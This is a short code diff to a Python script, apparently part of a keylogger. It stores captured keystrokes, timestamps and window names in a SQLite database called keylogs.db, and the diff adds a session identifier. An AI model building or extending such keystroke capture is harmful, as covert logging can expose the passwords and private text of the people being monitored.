@@ -1,4 +1,6 @@
 import sqlite3
+import uuid
+from datetime import datetime
 import listener
 #test  
 con = sqlite3.connect('keylogs.db')
@@ -7,6 +9,7 @@ key_data = listener.flush_buffer()
 ts = listener.last_timestamp
 window = "Window1" #temporaire a remplacer pars variable
 buffer_empty = getattr(listener, "buffer_empty", False)
+SESSION_ID = str(uuid.uuid4())[:8]
 #___________________________________________________________creation de la table_____________________________________________
 def create_table():
     cur.execute(""" CREATE TABLE IF NOT EXISTS keylogs(
